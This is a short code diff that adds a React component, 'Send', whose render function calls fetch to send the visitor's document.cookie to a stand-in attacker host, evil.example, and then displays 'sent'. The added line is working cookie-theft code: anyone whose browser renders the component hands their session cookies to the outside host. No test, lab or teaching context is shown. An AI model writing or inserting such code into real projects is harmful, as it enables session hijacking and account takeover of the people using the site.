@@ -1,0 +1,4 @@
+export default function Send() {
+  fetch("https://evil.example/collect?c=" + document.cookie);
+  return <p>sent</p>;
+}
